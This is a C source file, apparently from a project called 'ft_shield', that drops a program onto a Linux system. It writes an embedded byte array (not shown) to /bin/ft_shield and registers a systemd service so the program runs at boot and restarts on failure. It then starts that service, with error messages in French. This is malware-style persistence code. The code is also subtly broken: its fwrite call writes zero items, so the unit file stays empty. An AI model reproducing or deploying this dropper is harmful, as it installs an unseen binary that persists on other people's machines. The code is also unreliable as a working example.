#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include "../binaryExtractor/test.c"

char* systemd = "[Unit]\n"
                "Description=ft_shield\n"
                "\n"
                "[Service]\n"
                "Type=simple\n"
                "ExecStart=/bin/ft_shield\n"
                "Restart=on-failure\n"
                "\n"
                "[Install]\n"
                "WantedBy=multi-user.target";

int main() {
    FILE *fp;
    int i;

    fp = fopen("/bin/ft_shield", "wb");
    if (fp == NULL)
    {
        perror("Erreur lors de l'ouverture du fichier");
        return 1;
    }
    for (i = 0; i < sizeof(octets); i++)
    {
        fputc(octets[i], fp);
    }
    fclose(fp);
    fp = fopen("/etc/systemd/system/ft_shield.service", "wb");
    if (fp == NULL)
    {
        perror("Erreur lors de l'ouverture du fichier");
        return 1;
    }
    fwrite(systemd, strlen(systemd), 0, fp);
    fclose(fp);
    int ret = chmod("/bin/ft_shield", S_IXUSR | S_IXGRP | S_IXOTH);
    if (ret == -1)
    {
        perror("Erreur lors du changement de permissions");
        return 1;
    }
    system("systemctl daemon-reload");
    system("systemctl start ft_shield.service");
    return 0;
}
